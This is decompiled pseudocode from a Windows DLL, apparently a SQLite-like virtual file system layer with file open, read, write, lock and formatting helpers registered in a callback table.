//----- (10055425) --------------------------------------------------------
int __usercall sub_10055425@<eax>(int a1@<esi>, char *a2, int *a3)
{
  int result; // eax
  char v4[356]; // [esp+4h] [ebp-180h] BYREF
  int v5[6]; // [esp+168h] [ebp-1Ch] BYREF
  char v6; // [esp+180h] [ebp-4h]
  char v7; // [esp+181h] [ebp-3h]
  char v8; // [esp+182h] [ebp-2h]

  v5[3] = 0;
  v5[1] = (int)v4;
  v5[2] = (int)v4;
  v5[5] = *(_DWORD *)(a1 + 72);
  v5[4] = 350;
  v7 = 1;
  v8 = 0;
  v6 = 0;
  v5[0] = a1;
  sub_10054749((int)v5, 1, a2, a3);
  result = sub_1005539C((int)v5);
  if ( v6 )
    *(_BYTE *)(a1 + 30) = 1;
  return result;
}

//----- (10055484) --------------------------------------------------------
int __usercall sub_10055484@<eax>(int a1@<esi>, char *a2, ...)
{
  va_list va; // [esp+Ch] [ebp+Ch] BYREF

  va_start(va, a2);
  return sub_10055425(a1, a2, (int *)va);
}

//----- (10055499) --------------------------------------------------------
int __usercall sub_10055499@<eax>(int a1@<eax>, unsigned int a2, char *a3, ...)
{
  int v4; // edi
  va_list va; // [esp+18h] [ebp+10h] BYREF

  va_start(va, a3);
  v4 = sub_10055425(a1, a3, (int *)va);
  sub_10058EC7(a1, a2);
  return v4;
}

//----- (100554C0) --------------------------------------------------------
int __usercall sub_100554C0@<eax>(int a1@<edi>, int a2@<esi>, char *a3, int *a4)
{
  char v5[356]; // [esp+4h] [ebp-180h] BYREF
  int v6[6]; // [esp+168h] [ebp-1Ch] BYREF
  char v7; // [esp+180h] [ebp-4h]
  char v8; // [esp+181h] [ebp-3h]
  char v9; // [esp+182h] [ebp-2h]

  if ( sub_1005387F(a1, a2) )
    return 0;
  v6[1] = (int)v5;
  v6[2] = (int)v5;
  v6[0] = 0;
  v6[3] = 0;
  v9 = 0;
  v7 = 0;
  v6[4] = 350;
  v6[5] = 1000000000;
  v8 = 1;
  sub_10054749((int)v6, 0, a3, a4);
  return sub_1005539C((int)v6);
}

//----- (10055521) --------------------------------------------------------
int __usercall sub_10055521@<eax>(int a1@<edi>, int a2@<esi>, char *a3, ...)
{
  va_list va; // [esp+Ch] [ebp+Ch] BYREF

  va_start(va, a3);
  if ( sub_1005387F(a1, a2) )
    return 0;
  else
    return sub_100554C0(a1, a2, a3, (int *)va);
}

//----- (10055543) --------------------------------------------------------
int __usercall sub_10055543@<eax>(int a1@<edx>, int a2@<ecx>, char *a3, ...)
{
  char v4[28]; // [esp+4h] [ebp-1Ch] BYREF
  va_list va; // [esp+2Ch] [ebp+Ch] BYREF

  va_start(va, a3);
  if ( a1 <= 0 )
    return a2;
  sub_10055400((int)v4, a1, a2, 0);
  v4[25] = 0;
  sub_10054749((int)v4, 0, a3, (int *)va);
  return sub_1005539C((int)v4);
}

//----- (10055580) --------------------------------------------------------
int __stdcall sub_10055580(int a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  *(_DWORD *)a1 = off_1010461C;
  sub_10050B91((_DWORD *)(a1 + 4), 0);
  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *(_DWORD *)(a1 + 16) = v1;
  *(_DWORD *)(a1 + 12) = 0;
  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  *(_DWORD *)(a1 + 24) = v2;
  *(_DWORD *)(a1 + 20) = 0;
  v3 = operator new(4u);
  if ( v3 )
    *v3 = 1;
  else
    v3 = 0;
  *(_DWORD *)(a1 + 32) = v3;
  *(_DWORD *)(a1 + 28) = 0;
  v4 = operator new(4u);
  if ( v4 )
    *v4 = 1;
  else
    v4 = 0;
  *(_DWORD *)(a1 + 40) = v4;
  *(_DWORD *)(a1 + 36) = 0;
  sub_10050B91((_DWORD *)(a1 + 44), 0);
  *(_BYTE *)(a1 + 52) = 0;
  return a1;
}
// 1010461C: using guessed type int (__thiscall *off_1010461C[2])(void *Block, char);

//----- (1005566B) --------------------------------------------------------
_DWORD *__thiscall sub_1005566B(_DWORD *Block, char a2)
{
  sub_1005568A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1005568A) --------------------------------------------------------
void __thiscall sub_1005568A(_DWORD *this)
{
  *this = off_1010461C;
  sub_10020B81(this + 11);
  sub_10020B81(this + 9);
  sub_10020B81(this + 7);
  sub_10020B81(this + 5);
  sub_10020B81(this + 3);
  sub_10020B81(this + 1);
}
// 1010461C: using guessed type int (__thiscall *off_1010461C[2])(void *Block, char);

//----- (100556F9) --------------------------------------------------------
int *__stdcall sub_100556F9(int *a1)
{
  int v1; // edx

  *a1 = sub_10014BAB();
  a1[1] = v1;
  sub_10057A6E(a1 + 2);
  a1[11] = (int)off_1010465C;
  sub_1001EC12((int)(a1 + 12));
  a1[21] = (int)(a1 + 2);
  return a1;
}
// 10055715: variable 'v1' is possibly undefined
// 1010465C: using guessed type int (__thiscall *off_1010465C[2])(void *Block, char);

//----- (10055754) --------------------------------------------------------
_DWORD *__stdcall sub_10055754(int a1, _DWORD *a2, char a3)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  volatile LONG *v5; // ecx
  _DWORD *v7[3]; // [esp+8h] [ebp-1Ch] BYREF
  int v8; // [esp+14h] [ebp-10h]
  int v9; // [esp+20h] [ebp-4h]

  v8 = 0;
  v3 = sub_10056C2E(a1 + 44, v7);
  v9 = 1;
  v4 = (_DWORD *)(*(int (__thiscall **)(_DWORD, char *))(*(_DWORD *)v3[2] + 16))(v3[2], &a3);
  v5 = (volatile LONG *)v4[1];
  a2[1] = v5;
  *a2 = *v4;
  InterlockedIncrement(v5);
  v8 = 1;
  LOBYTE(v9) = 0;
  sub_1000EDA4(v7);
  return a2;
}

//----- (100557BE) --------------------------------------------------------
void __stdcall sub_100557BE(int a1, char a2, char a3, int a4)
{
  _DWORD *v4; // eax
  _DWORD *v5[3]; // [esp+0h] [ebp-18h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v6 = 0;
  v4 = sub_10056C2E(a1 + 44, v5);
  LOBYTE(v6) = 1;
  (*(void (__thiscall **)(_DWORD, char *, char *))(*(_DWORD *)v4[2] + 24))(v4[2], &a2, &a3);
  LOBYTE(v6) = 0;
  sub_1000EDA4(v5);
  v6 = -1;
  sub_10020B81(&a3);
}

//----- (10055819) --------------------------------------------------------
int __cdecl sub_10055819(int a1, int a2, _DWORD *a3, char a4, _DWORD *a5)
{
  char v5; // bl
  _DWORD *v6; // eax
  LONG *v7; // eax
  void *v8; // eax
  volatile LONG *v9; // ecx
  int v10; // eax
  int v11; // edi
  wchar_t *v12; // eax
  bool v13; // bl
  int *v14; // esi
  _DWORD *v15; // eax
  int v16; // eax
  _DWORD *v17; // edi
  int v18; // esi
  int v19; // eax
  _DWORD *v20; // ecx
  int v21; // eax
  int v22; // eax
  _DWORD *v23; // eax
  _DWORD *v24; // eax
  _DWORD *v25; // eax
  _DWORD *v26; // eax
  volatile LONG *v28; // [esp-8h] [ebp-7Ch] BYREF
  volatile LONG *v29; // [esp-4h] [ebp-78h]
  int v30; // [esp+0h] [ebp-74h] BYREF
  int v31[5]; // [esp+10h] [ebp-64h] BYREF
  int v32[2]; // [esp+24h] [ebp-50h] BYREF
  int v33[2]; // [esp+2Ch] [ebp-48h] BYREF
  int v34; // [esp+34h] [ebp-40h] BYREF
  LONG v35; // [esp+38h] [ebp-3Ch] BYREF
  int v36; // [esp+48h] [ebp-2Ch] BYREF
  void *v37; // [esp+4Ch] [ebp-28h]
  char v38[4]; // [esp+50h] [ebp-24h] BYREF
  void *Block; // [esp+54h] [ebp-20h]
  int v40; // [esp+58h] [ebp-1Ch]
  int v41; // [esp+5Ch] [ebp-18h]
  bool v42; // [esp+62h] [ebp-12h]
  char v43; // [esp+63h] [ebp-11h]
  int *v44; // [esp+64h] [ebp-10h]
  int v45; // [esp+70h] [ebp-4h]

  v44 = &v30;
  v41 = 0;
  sub_10057D7C((int)&a2 + 3);
  sub_1000D17D(&v34, &word_10130434);
  v45 = 0;
  v43 = 0;
  v42 = 0;
  if ( a2 )
  {
    v7 = sub_10056793(v32, (char *)a2);
    LOBYTE(v45) = 2;
    sub_10001236(v7 + 1, &v35);
    LOBYTE(v45) = 0;
    sub_1000D3AD(v32);
    v42 = sub_10014AF7((int)&v34);
    v5 = a4;
  }
  else
  {
    v5 = a4;
    if ( (a4 & 8) == 0 )
    {
      v45 = -1;
      sub_1000D3AD(&v34);
      return 1;
    }
    v6 = sub_10015017(v32);
    LOBYTE(v45) = 1;
    sub_10001236(v6 + 1, &v35);
    LOBYTE(v45) = 0;
    sub_1000D3AD(v32);
    v43 = 1;
  }
  LOBYTE(v45) = 4;
  v8 = operator new(0x38u);
  v9 = v29;
  HIBYTE(a2) = HIBYTE(v8);
  LOBYTE(v45) = 5;
  if ( v8 )
    v10 = sub_10055580((int)v8);
  else
    v10 = 0;
  LOBYTE(v45) = 4;
  v29 = v9;
  v28 = v9;
  a2 = (int)&v28;
  sub_10050B91(&v28, v10);
  LOBYTE(v45) = 4;
  sub_100557BE(dword_10183298, (char)a3, (char)v28, (int)v29);
  a2 = 0;
  if ( (v5 & 1) != 0 )
    a2 = 0x80000000;
  v40 = v5 & 2;
  if ( (v5 & 2) != 0 )
    a2 = -1073741824;
  v11 = 3;
  if ( (v5 & 4) != 0 )
    v11 = 4;
  sub_10055754(dword_10183298, v33, (char)a3);
  LOBYTE(v45) = 7;
  *(_BYTE *)(v33[0] + 52) = (v5 & 8) != 0;
  v12 = (wchar_t *)sub_1000CC40((int)&unk_10130438);
  sub_1000D17D(&v36, v12);
  LOBYTE(v45) = 8;
  v13 = sub_1000DF75((int)&v34, (int)&v36, 0) != -1;
  LOBYTE(v45) = 7;
  sub_1000D3AD(&v36);
  sub_10056994(v32, (int)&v34);
  LOBYTE(v45) = 9;
  v14 = (int *)v32[0];
  if ( v32[0] )
  {
    v28 = v29;
    v37 = &v28;
    sub_1000B87D(&v28);
    LOBYTE(v45) = 14;
    v16 = *v14;
    LOBYTE(v45) = 9;
    v17 = (_DWORD *)(*(int (__thiscall **)(int *, char *, int *, int, int, int, int))(v16 + 4))(
                      v14,
                      v38,
                      &v34,
                      a2,
                      128,
                      3,
                      v11);
    LOBYTE(v45) = 15;
    v18 = v33[0] + 4;
    if ( *(_DWORD *)(v33[0] + 4) != *v17 )
    {
      sub_10040447(v18);
      *(_DWORD *)(v18 + 4) = v17[1];
      *(_DWORD *)v18 = *v17;
      InterlockedIncrement(*(volatile LONG **)(v18 + 4));
    }
    LOBYTE(v45) = 9;
    sub_10020B81(v38);
    goto LABEL_25;
  }
  if ( !v13 )
  {
    Block = operator new(0x50u);
    LOBYTE(v45) = 12;
    if ( Block )
    {
      v28 = v29;
      v37 = &v28;
      sub_1000B87D(&v28);
      LOBYTE(v45) = 12;
      v15 = (_DWORD *)sub_1001F4DD(a2, (int)Block, (int)&v34, (_DWORD *)dword_10183298, v11, (int)v28, v29);
      goto LABEL_21;
    }
LABEL_20:
    v15 = 0;
    goto LABEL_21;
  }
  Block = operator new(0x28u);
  LOBYTE(v45) = 10;
  if ( !Block )
    goto LABEL_20;
  v28 = v29;
  v37 = &v28;
  sub_1000B87D(&v28);
  LOBYTE(v45) = 10;
  v15 = sub_1000BA6E(3, a2, Block, (int)&v34, 128, v11, (int)v28, v29);
LABEL_21:
  LOBYTE(v45) = 9;
  sub_100572CC((_DWORD *)(v33[0] + 4), (int)v15);
LABEL_25:
  v43 = 1;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(v33[0] + 4) + 4))(*(_DWORD *)(v33[0] + 4));
  v19 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v33[0] + 4) + 16))(*(_DWORD *)(v33[0] + 4));
  v20 = a3;
  a3[1] = v19;
  v20[4] = 4096;
  a2 = (int)operator new(0x14u);
  LOBYTE(v45) = 16;
  if ( a2 )
  {
    v28 = v29;
    v37 = &v28;
    sub_10011AE0((_DWORD *)(v33[0] + 4), &v28);
    LOBYTE(v45) = 16;
    v21 = sub_10011942(a2, (int)v28, v29);
  }
  else
  {
    v21 = 0;
  }
  LOBYTE(v45) = 9;
  sub_100572CC((_DWORD *)(v33[0] + 44), v21);
  a2 = (int)operator new(0x14u);
  LOBYTE(v45) = 18;
  if ( a2 )
  {
    v28 = v29;
    v37 = &v28;
    sub_10011AE0((_DWORD *)(v33[0] + 4), &v28);
    LOBYTE(v45) = 18;
    v22 = sub_10051829(a2, (int)v28, v29);
  }
  else
  {
    v22 = 0;
  }
  LOBYTE(v45) = 9;
  sub_100572CC((_DWORD *)(v33[0] + 36), v22);
  a2 = (int)operator new(0x30u);
  LOBYTE(v45) = 20;
  if ( a2 )
  {
    v23 = (_DWORD *)sub_10056A59((int)v31);
    LOBYTE(v45) = 21;
    v41 = 1;
    v24 = sub_10016198(v23, (_DWORD *)a2);
  }
  else
  {
    v24 = 0;
  }
  v45 = 22;
  sub_100572CC((_DWORD *)(v33[0] + 12), (int)v24);
  v45 = 9;
  if ( (v41 & 1) != 0 )
  {
    v41 &= ~1u;
    sub_1000B3DF(v31);
  }
  a2 = (int)operator new(0x28u);
  LOBYTE(v45) = 23;
  if ( a2 )
    v25 = sub_10015DB2(
            *(void **)(v33[0] + 44),
            (_DWORD *)a2,
            *(_DWORD *)(v33[0] + 12) != 0 ? *(_DWORD *)(v33[0] + 12) + 4 : 0);
  else
    v25 = 0;
  LOBYTE(v45) = 9;
  sub_100572CC((_DWORD *)(v33[0] + 28), (int)v25);
  a2 = (int)operator new(0x3Cu);
  LOBYTE(v45) = 24;
  if ( a2 )
    v26 = sub_10015F9A(*(void **)(v33[0] + 36), (_DWORD *)a2, *(_DWORD *)(v33[0] + 12));
  else
    v26 = 0;
  LOBYTE(v45) = 9;
  sub_100572CC((_DWORD *)(v33[0] + 20), (int)v26);
  *a3 = &unk_10130324;
  LOBYTE(v45) = 7;
  sub_10057DCD((void **)v32);
  LOBYTE(v45) = 4;
  sub_10020B81(v33);
  v45 = 0;
  if ( a5 )
    *a5 = (v40 != 0) + 1;
  v45 = -1;
  sub_1000D3AD(&v34);
  return 0;
}
// 100558EF: variable 'v9' is possibly undefined
// 10055819: using guessed type char var_24[4];
// 10055819: using guessed type int var_64[5];

//----- (10055D77) --------------------------------------------------------
int __cdecl sub_10055D77(int a1, char *String)
{
  int v3; // [esp+0h] [ebp-24h] BYREF
  int v4[3]; // [esp+Ch] [ebp-18h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v4[2] = (int)&v3;
  v5 = 0;
  sub_10056793(v4, String);
  LOBYTE(v5) = 1;
  sub_10014B0E(v4);
  LOBYTE(v5) = 0;
  sub_1000D3AD(v4);
  return 0;
}

//----- (10055DE9) --------------------------------------------------------
int __cdecl sub_10055DE9(int a1, char *String, int a3, BOOL *a4)
{
  const CHAR *v4; // eax
  int v5; // esi
  int v7[3]; // [esp+8h] [ebp-18h] BYREF
  int v8; // [esp+1Ch] [ebp-4h]

  sub_10056793(v7, String);
  v8 = 0;
  v4 = (const CHAR *)sub_1000D3DA((int)v7);
  v5 = sub_10070281(a1, v4, a3, a4);
  v8 = -1;
  sub_1000D3AD(v7);
  return v5;
}

//----- (10055E59) --------------------------------------------------------
int __cdecl sub_10055E59(int a1, char *Source, size_t Count, char *Destination)
{
  strncpy(Destination, Source, Count);
  return 0;
}

//----- (10055E71) --------------------------------------------------------
int __cdecl sub_10055E71(int a1, int Src, char *a3)
{
  return sub_10070484(a1, Src, a3);
}

//----- (10055E89) --------------------------------------------------------
int __cdecl sub_10055E89(int a1, int a2)
{
  int v2; // ebx
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  char v6; // [esp+Eh] [ebp-32Ah]
  char v7; // [esp+Fh] [ebp-329h] BYREF
  int v8[2]; // [esp+10h] [ebp-328h] BYREF
  _DWORD v9[197]; // [esp+18h] [ebp-320h] BYREF
  int v10; // [esp+334h] [ebp-4h]

  sub_10050D14(&v7);
  sub_1001E85D(v9);
  v2 = 0;
  v10 = 0;
  v3 = sub_1005695A(dword_101831D4, v8);
  LOBYTE(v10) = 1;
  sub_1001E967((int)v9, (int)v3);
  LOBYTE(v10) = 0;
  sub_10012E7E(v8);
  v4 = sub_1001EA28((int)v9, v8, 1000 * ((a2 + 999) / 1000), 0, 0);
  LOBYTE(v10) = 2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*v4 + 4))(v4);
  LOBYTE(v10) = 0;
  sub_10012E7E(v8);
  if ( v6 )
    v2 = a2;
  v10 = -1;
  sub_1001E8ED(v9);
  return v2;
}
// 10050D14: using guessed type int __thiscall sub_10050D14(_DWORD);
// 101831D4: using guessed type int dword_101831D4;
// 10055E89: using guessed type _DWORD var_320[197];

//----- (10055F79) --------------------------------------------------------
int __cdecl sub_10055F79(int a1, double *a2)
{
  return sub_10070558(a1, a2);
}

//----- (10055F82) --------------------------------------------------------
int __cdecl sub_10055F82(int a1, int a2, int a3)
{
  return sub_100705F1(a1, a2, a3);
}

//----- (10055F9A) --------------------------------------------------------
int __cdecl sub_10055F9A(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  char v3; // bl
  int v5; // [esp+0h] [ebp-44h] BYREF
  _DWORD *v6[3]; // [esp+10h] [ebp-34h] BYREF
  int v7[2]; // [esp+1Ch] [ebp-28h] BYREF
  int v8[2]; // [esp+24h] [ebp-20h] BYREF
  void *Block; // [esp+2Ch] [ebp-18h] BYREF
  char v10; // [esp+32h] [ebp-12h]
  char v11; // [esp+33h] [ebp-11h] BYREF
  int *v12; // [esp+34h] [ebp-10h]
  int v13; // [esp+40h] [ebp-4h]

  v12 = &v5;
  sub_10057D7C((int)&v11);
  sub_10055754(dword_10183298, v8, (char)a1);
  v13 = 0;
  (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(v8[0] + 4) + 24))(*(_DWORD *)(v8[0] + 4), v7);
  LOBYTE(v13) = 1;
  v11 = *(_BYTE *)(v8[0] + 52);
  sub_10040447((int)v8);
  v1 = operator new(4u);
  Block = v1;
  LOBYTE(v13) = 2;
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  v8[1] = (int)v1;
  v8[0] = 0;
  LOBYTE(v13) = 3;
  Block = a1;
  v2 = sub_10056C2E(dword_10183298 + 44, v6);
  LOBYTE(v13) = 4;
  v3 = (*(int (__thiscall **)(_DWORD, void **))(*(_DWORD *)v2[2] + 12))(v2[2], &Block);
  LOBYTE(v13) = 3;
  sub_1000EDA4(v6);
  v10 = v3;
  if ( v3 )
    a1[1] = -1;
  v13 = 1;
  if ( v11 )
  {
    LOBYTE(v13) = 6;
    sub_10014B0E(v7);
  }
  v13 = 0;
  sub_1000D3AD(v7);
  v13 = -1;
  sub_10020B81(v8);
  return v3 != 0 ? 0 : 4106;
}

//----- (10056143) --------------------------------------------------------
int __cdecl sub_10056143(char a1, void *a2, void *a3, int a4)
{
  const void *v4; // eax
  size_t v6; // [esp-4h] [ebp-40h]
  int v7; // [esp+0h] [ebp-3Ch] BYREF
  int v8[5]; // [esp+Ch] [ebp-30h] BYREF
  int v9[2]; // [esp+20h] [ebp-1Ch] BYREF
  char v10; // [esp+2Bh] [ebp-11h] BYREF
  int *v11; // [esp+2Ch] [ebp-10h]
  int v12; // [esp+38h] [ebp-4h]

  v11 = &v7;
  sub_10057D7C((int)&v10);
  sub_10055754(dword_10183298, v9, a1);
  v12 = 1;
  sub_1000B1F3(a3, (int)v8, 0);
  LOBYTE(v12) = 2;
  (*(void (__thiscall **)(_DWORD, int, _DWORD))(**(_DWORD **)(v9[0] + 28) + 8))(*(_DWORD *)(v9[0] + 28), a4, 0);
  v6 = (*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(v9[0] + 28) + 12))(*(_DWORD *)(v9[0] + 28), v8);
  v4 = (const void *)sub_1000B4B8(v8);
  memcpy(a2, v4, v6);
  LOBYTE(v12) = 1;
  sub_1000B3DF(v8);
  v12 = -1;
  sub_10020B81(v9);
  return 0;
}
// 10056143: using guessed type int var_30[5];

//----- (1005621F) --------------------------------------------------------
int __cdecl sub_1005621F(char a1, void *Src, size_t Size, int a4)
{
  int v4; // ecx
  void *v5; // eax
  int v7; // [esp+0h] [ebp-3Ch] BYREF
  int v8[5]; // [esp+Ch] [ebp-30h] BYREF
  int v9[2]; // [esp+20h] [ebp-1Ch] BYREF
  char v10; // [esp+2Bh] [ebp-11h] BYREF
  int *v11; // [esp+2Ch] [ebp-10h]
  int v12; // [esp+38h] [ebp-4h]

  v11 = &v7;
  sub_10057D7C((int)&v10);
  sub_10055754(dword_10183298, v9, a1);
  v12 = 1;
  (*(void (__thiscall **)(_DWORD, int, _DWORD))(**(_DWORD **)(v9[0] + 20) + 8))(*(_DWORD *)(v9[0] + 20), a4, 0);
  sub_1000B1F3((void *)Size, (int)v8, 0);
  LOBYTE(v12) = 2;
  v5 = (void *)sub_1000B49B(v8, v4);
  memcpy(v5, Src, Size);
  (*(void (__thiscall **)(_DWORD, int *))(**(_DWORD **)(v9[0] + 20) + 12))(*(_DWORD *)(v9[0] + 20), v8);
  LOBYTE(v12) = 1;
  sub_1000B3DF(v8);
  v12 = -1;
  sub_10020B81(v9);
  return 0;
}
// 1005627D: variable 'v4' is possibly undefined
// 1005621F: using guessed type int var_30[5];

//----- (100562FB) --------------------------------------------------------
int __cdecl sub_100562FB(int a1, LONG lDistanceToMove, int a3)
{
  char v4; // [esp+7h] [ebp-1h] BYREF

  sub_10057D7C((int)&v4);
  return sub_1006FA5A(a1, lDistanceToMove, a3);
}

//----- (10056322) --------------------------------------------------------
int __cdecl sub_10056322(char a1)
{
  int v2; // [esp+0h] [ebp-30h] BYREF
  int v3[2]; // [esp+10h] [ebp-20h] BYREF
  char v4[5]; // [esp+1Bh] [ebp-15h] BYREF
  int *v5; // [esp+20h] [ebp-10h]
  int v6; // [esp+2Ch] [ebp-4h]

  v5 = &v2;
  sub_10057D7C((int)v4);
  sub_10055754(dword_10183298, v3, a1);
  v6 = 1;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(v3[0] + 4) + 80))(*(_DWORD *)(v3[0] + 4));
  v6 = -1;
  sub_10020B81(v3);
  return 0;
}
// 10056322: using guessed type char var_15[5];

//----- (100563B8) --------------------------------------------------------
int __cdecl sub_100563B8(char a1, _DWORD *a2)
{
  int v3; // [esp+0h] [ebp-30h] BYREF
  int v4[2]; // [esp+10h] [ebp-20h] BYREF
  char v5[5]; // [esp+1Bh] [ebp-15h] BYREF
  int *v6; // [esp+20h] [ebp-10h]
  int v7; // [esp+2Ch] [ebp-4h]

  v6 = &v3;
  sub_10057D7C((int)v5);
  sub_10055754(dword_10183298, v4, a1);
  v7 = 1;
  *a2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v4[0] + 4) + 120))(*(_DWORD *)(v4[0] + 4));
  a2[1] = 0;
  v7 = -1;
  sub_10020B81(v4);
  return 0;
}
// 100563B8: using guessed type char var_15[5];

//----- (10056444) --------------------------------------------------------
int __cdecl sub_10056444(int a1, int a2)
{
  int result; // eax
  char v3; // [esp+7h] [ebp-1h] BYREF

  sub_10057D7C((int)&v3);
  result = sub_1006FBFA(a1, a2);
  if ( result )
  {
    if ( *(_DWORD *)(a1 + 12) == 6 )
      return 10;
  }
  return result;
}

//----- (10056470) --------------------------------------------------------
int __cdecl sub_10056470(int a1, int a2)
{
  char v3; // [esp+7h] [ebp-1h] BYREF

  sub_10057D7C((int)&v3);
  return sub_1006FDB1(a1, a2);
}

//----- (1005648D) --------------------------------------------------------
int __cdecl sub_1005648D(int a1, BOOL *a2)
{
  char v3; // [esp+7h] [ebp-1h] BYREF

  sub_10057D7C((int)&v3);
  return sub_1006FD5F(a1, a2);
}

//----- (100564AA) --------------------------------------------------------
int __fastcall sub_100564AA(int a1)
{
  char v2; // [esp+1h] [ebp-1h] BYREF

  v2 = HIBYTE(a1);
  sub_10057D7C((int)&v2);
  return 0;
}

//----- (100564BB) --------------------------------------------------------
int __fastcall sub_100564BB(int a1)
{
  char v2; // [esp+1h] [ebp-1h] BYREF

  v2 = HIBYTE(a1);
  sub_10057D7C((int)&v2);
  return 4096;
}

//----- (100564CF) --------------------------------------------------------
int *__stdcall sub_100564CF(int *a1)
{
  _DWORD *v1; // eax
  int v3[3]; // [esp+Ch] [ebp-20h] BYREF
  int v4[2]; // [esp+18h] [ebp-14h] BYREF
  int v5; // [esp+28h] [ebp-4h]

  *a1 = (int)&off_101047B4;
  v5 = 0;
  *a1 = (int)&off_10104724;
  sub_10012E21(a1 + 19, (void *)0xFFFFFFFF, 0);
  v4[1] = (int)(a1 + 21);
  a1[21] = (int)off_100FBF5C;
  a1[21] = (int)&off_10104730;
  a1[22] = 0;
  a1[23] = 0;
  a1[24] = 0;
  sub_1001EC12((int)(a1 + 25));
  LOBYTE(v5) = 5;
  a1[5] = dword_1017DB60;
  a1[3] = 260;
  a1[7] = (int)sub_10055819;
  a1[8] = (int)sub_10055D77;
  a1[9] = (int)sub_10055DE9;
  a1[10] = (int)sub_10055E59;
  a1[11] = 0;
  a1[12] = 0;
  a1[13] = 0;
  a1[14] = 0;
  a1[15] = (int)sub_10055E71;
  a1[16] = (int)sub_10055E89;
  a1[17] = (int)sub_10055F79;
  a1[18] = (int)sub_10055F82;
  a1[2] = 20;
  a1[1] = 1;
  sub_1000D17D(v4, &word_1013046C);
  LOBYTE(v5) = 6;
  v1 = sub_100229B0(v3, (int)v4);
  LOBYTE(v5) = 7;
  sub_100130E8(v1 + 1, a1 + 20);
  LOBYTE(v5) = 6;
  sub_10022A50(v3);
  LOBYTE(v5) = 5;
  sub_1000D3AD(v4);
  dword_10130328 = (int)sub_10055F9A;
  dword_1013032C = (int)sub_10056143;
  dword_10130330 = (int)sub_1005621F;
  dword_10130334 = (int)sub_100562FB;
  dword_10130338 = (int)sub_10056322;
  dword_1013033C = (int)sub_100563B8;
  dword_10130340 = (int)sub_10056444;
  dword_10130344 = (int)sub_10056470;
  dword_10130348 = (int)sub_1005648D;
  dword_1013034C = (int)sub_100564AA;
  dword_10130350 = (int)sub_100564BB;
  dword_10130354 = (int)sub_100564AA;
  sub_1005670D(a1);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104724: using guessed type int (__thiscall *off_10104724)(void *Block, char);
// 10104730: using guessed type int (__thiscall *off_10104730)(void *Block, char);
// 101047B4: using guessed type int (__thiscall *off_101047B4)(void *Block, char);
// 10130328: using guessed type int dword_10130328;
// 1013032C: using guessed type int dword_1013032C;
// 10130330: using guessed type int dword_10130330;
// 10130334: using guessed type int dword_10130334;
// 10130338: using guessed type int dword_10130338;
// 1013033C: using guessed type int dword_1013033C;
// 10130340: using guessed type int dword_10130340;
// 10130344: using guessed type int dword_10130344;
// 10130348: using guessed type int dword_10130348;
// 1013034C: using guessed type int dword_1013034C;
// 10130350: using guessed type int dword_10130350;
// 10130354: using guessed type int dword_10130354;
// 1017DB60: using guessed type int dword_1017DB60;
// 100564CF: using guessed type int var_20[3];

//----- (10056670) --------------------------------------------------------
int *__thiscall sub_10056670(int *Block, char a2)
{
  sub_1005668F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1005668F) --------------------------------------------------------
void __thiscall sub_1005668F(int *this)
{
  _DWORD v2[5]; // [esp+0h] [ebp-20h] BYREF
  int v3; // [esp+1Ch] [ebp-4h]

  v2[4] = v2;
  v2[3] = this;
  *this = (int)&off_10104724;
  v3 = 4;
  sub_10056763(this);
  v3 = 2;
  sub_1001ECA1(this + 25);
  LOBYTE(v3) = 1;
  sub_10056C79(this + 21);
  LOBYTE(v3) = 0;
  sub_10012E7E(this + 19);
  *this = (int)&off_101047B4;
}
// 10104724: using guessed type int (__thiscall *off_10104724)(void *Block, char);
// 101047B4: using guessed type int (__thiscall *off_101047B4)(void *Block, char);

//----- (1005670D) --------------------------------------------------------
int __thiscall sub_1005670D(void *this)
{
  int result; // eax
  _DWORD *v2; // eax
  _DWORD v3[8]; // [esp+8h] [ebp-20h] BYREF

  result = sub_10067565((int)this + 4);
  if ( result )
  {
    v2 = sub_100536F1(v3, result);
    v3[7] = 0;
    sub_100501AF((int)v2, 686);
  }
  return result;
}

//----- (10056763) --------------------------------------------------------
int __thiscall sub_10056763(void *this)
{
  int v2; // edi
  int v4; // [esp-4h] [ebp-Ch]

  v2 = sub_100612DC();
  sub_10061305(v2);
  sub_10067528(v4, (int)this + 4);
  return sub_10061317(v2);
}
// 10056781: variable 'v4' is possibly undefined

//----- (10056793) --------------------------------------------------------
LONG *__cdecl sub_10056793(LONG *a1, char *String)
{
  _DWORD *v2; // eax
  int v3; // eax
  int v4; // eax
  _DWORD *v5; // eax
  int v7[14]; // [esp+Ch] [ebp-7Ch] BYREF
  int v8[2]; // [esp+44h] [ebp-44h] BYREF
  int v9[2]; // [esp+4Ch] [ebp-3Ch] BYREF
  int v10[2]; // [esp+54h] [ebp-34h] BYREF
  int v11[2]; // [esp+5Ch] [ebp-2Ch] BYREF
  int v12[2]; // [esp+64h] [ebp-24h] BYREF
  LONG v13[2]; // [esp+6Ch] [ebp-1Ch] BYREF
  int v14; // [esp+74h] [ebp-14h]
  int v15; // [esp+84h] [ebp-4h]

  v15 = 0;
  v14 = 0;
  v2 = sub_1000D3EB(v10, String);
  v15 = 1;
  v3 = sub_1000E111((int)v2);
  sub_1000D372(a1, v3);
  v14 = 1;
  LOBYTE(v15) = 0;
  sub_1000D3AD(v10);
  sub_10022B77((int)v7, (int)a1);
  v15 = 2;
  sub_10022E68((int)v7, v8);
